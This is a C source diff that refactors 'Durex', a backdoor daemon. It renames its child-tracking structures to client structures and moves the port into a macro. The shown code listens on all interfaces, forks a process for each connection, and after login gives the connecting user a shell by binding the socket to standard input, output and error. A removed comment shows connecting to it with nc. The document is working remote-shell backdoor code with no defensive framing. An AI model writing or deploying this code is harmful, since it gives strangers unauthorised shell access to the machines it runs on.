@@ -13,16 +13,13 @@
 
 #include <md.h>
 
-static int nb; //Connected client
-
-t_child *child; //Map shared between fork
+t_client *client; //Map shared between fork
 
 int bash_prompt( int sck ) {
 	close(0);
 	close(1);
 	close(2);
 	if( dup(sck) != 0 || dup(sck) != 1 || dup(sck) != 2 ) {
-		//perror("error duplicating socket for stdin/stdout/stderr");
 		exit(1);
 	}
 	setvbuf(stdout, NULL, _IONBF, 0);
@@ -33,7 +30,7 @@ int bash_prompt( int sck ) {
 	exit(1);
 }
 
-void new_child(int sck) {
+void new_client(int sck) {
 	char 	*buf;
 	int 	run;
 	int		ret;
@@ -62,7 +59,7 @@ void new_child(int sck) {
 
 			} else if (login) { //Secure zone
  				if (strncmp(buf, "help", 4) == 0) {
-					dprintf(sck, "Durex v1.0: Available command:\nhelp\nshell\nquit\n");
+					dprintf(sck, HELP);
 				} else if (strncmp(buf, "shell", 5) == 0) {
 					bash_prompt(sck);
 				} else if (strncmp(buf, "quit", 4) == 0) {
@@ -77,27 +74,26 @@ void new_child(int sck) {
 	close(sck);
 	exit(0);
 }
-//Handler signal SIGCHLD  clean up t_child[] socket and nb
+//Handler signal SIGCHLD  clean up t_client[] socket and nb
 void handler(int sig) {
 	pid_t pid;
 
 	(void)sig;
 	pid = wait(NULL);
 	for (int i = 0; i < MAX; i++) {
-		if (child[i].pid == pid) {
-			child[i].pid = -1;
-			write(child[i].socket, "", 0);
-			close(child[i].socket);
-			child[i].socket = -1;
+		if (client[i].pid == pid) {
+			client[i].pid = -1;
+			write(client[i].socket, "", 0);
+			close(client[i].socket);
+			client[i].socket = -1;
 		}
 	}
-	nb--;
 }
 
-//Search empty slot in child
-int child_slot() {
+//Search empty slot in client
+int client_slot() {
 	for (int i = 0;i < MAX; i++) {
-		if (child[i].pid == -1) {
+		if (client[i].pid == -1) {
 			return (i);
 		}
 	}
@@ -107,22 +103,22 @@ int child_slot() {
 int durex( int argc, char** argv) {
 	(void)argc;
 	(void)argv;
-	nb = 0;
-	int sck, client, addrlen;
+	int sck, sck_client, addrlen;
 	struct sockaddr_in this_addr, peer_addr;
-	pid_t child_pid = -1;
-	unsigned short port = 4242; /* random port to listen on */
+	pid_t client_pid = -1;
 
-	child = (t_child *)mmap(NULL, sizeof(t_child) * MAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	client = (t_client *)mmap(NULL, sizeof(t_client) * MAX, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	for (int i = 0; i < MAX; i++) {
-		child[i].pid = -1;
-		child[i].socket = -1;
+		client[i].pid = -1;
+		client[i].socket = -1;
 	}
 	signal(SIGCHLD, handler);
+	
+	//Boring Init Socket
 	addrlen = sizeof( struct sockaddr_in );
 	memset(&this_addr, 0, addrlen );
 	memset( &peer_addr, 0, addrlen );
-	this_addr.sin_port        = htons(port);
+	this_addr.sin_port        = htons(PORT);
 	this_addr.sin_family      = AF_INET;
 	this_addr.sin_addr.s_addr = htonl(INADDR_ANY);
 	sck = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
@@ -130,26 +126,25 @@ int durex( int argc, char** argv) {
     setsockopt(sck, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
 	bind( sck, (struct sockaddr*)&this_addr, addrlen );
 	listen( sck, 5 );
-	//printf("Remote shell ready connect from nc localhost 4242 \n");
-	while( -1 != (client = accept( sck, (struct sockaddr*)&peer_addr, (socklen_t *)&addrlen ) ) ) {
+	
+	//Accept loop
+	while( -1 != (sck_client = accept( sck, (struct sockaddr*)&peer_addr, (socklen_t *)&addrlen ) ) ) {
 		int slot = -1;
-		slot = child_slot();
-		if (slot >= 0) {
-			child[slot].socket = client;
-			nb++;
-			child_pid = fork();
-			if( child_pid == 0 ) {
-				slot = child_slot();
+		slot = client_slot();
+		if (slot >= 0) { // If empty slot
+			client[slot].socket = sck_client;
+			client_pid = fork();
+			if( client_pid == 0 ) { //Child fork
+				slot = client_slot();
 				int pid = getpid();
-				child[slot].pid = pid;
-				new_child(client);
+				client[slot].pid = pid;
+				new_client(sck_client);
 			}
-		} else {
-			dprintf(client, "Already %d connected ! Go Away \n", nb);
-			write(client, "", 0);
-			close(client);
+		} else { //No empty slot
+			dprintf(sck_client, "Already %d connected ! Go Away \n", MAX);
+			write(sck_client, "", 0);
+			close(sck_client);
 		}
 	}
-	exit(1);
 	return 0;
 }
